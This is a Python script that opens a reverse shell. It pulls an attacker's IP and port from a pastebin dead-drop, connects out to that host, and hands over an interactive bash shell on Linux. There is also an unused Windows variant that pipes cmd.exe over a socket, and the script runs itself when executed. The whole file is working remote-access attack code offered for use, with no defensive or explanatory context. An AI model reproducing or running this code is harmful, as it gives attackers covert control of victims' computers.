import requests
import subprocess
import platform
import socket
import os
import pty
import threading


class iLoveReverseShell:

    # Retrieves Data from your pastebin and Scrapes And Extract IP and PORT (Only NGROK 2023-01-01)
    def get_ip(self):
        r = requests.get("https://pastebin.com/raw/svxdmC7k")
        ip_content = r.content.decode()
        if "None" in ip_content:
            exit()
        ip_content = ip_content[6:]
        ip_content = ip_content.split(":")
        ip_addr, ip_port = ip_content
        return ip_addr, ip_port


    # Returns 0 If the system in lInux or It will return 1 if it is windows
    def linux_or_windows(self):
        current_os = platform.system()
        flag = 2
        if current_os == "Linux":
            flag = 0
        elif current_os == "Windows":
            flag = 1
        
        return flag

    
    def run_rev_shell(self):
        current_os = self.linux_or_windows()
        if current_os == 0:
            self.linux_reverse_shell()
    

    def linux_reverse_shell(self):
        print("Linux Reverse Shell")
        ip, port = self.get_ip()
        port = int(port)
        print(ip, port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")

    
    def windows_reverse_shell(self):
        ip, port = self.get_ip()
        port = int(port)
        def s2p(s, p):
            while True:
                data = s.recv(1024)
                if len(data) > 0:
                    p.stdin.write(data)
                    p.stdin.flush()
        
        def p2s(s, p):
            while True:
                s.send(p.stdout.read(1))
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        p = subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            p.wait()

        except KeyboardInterrupt:
            s.close()



revShell = iLoveReverseShell()
revShell.run_rev_shell()
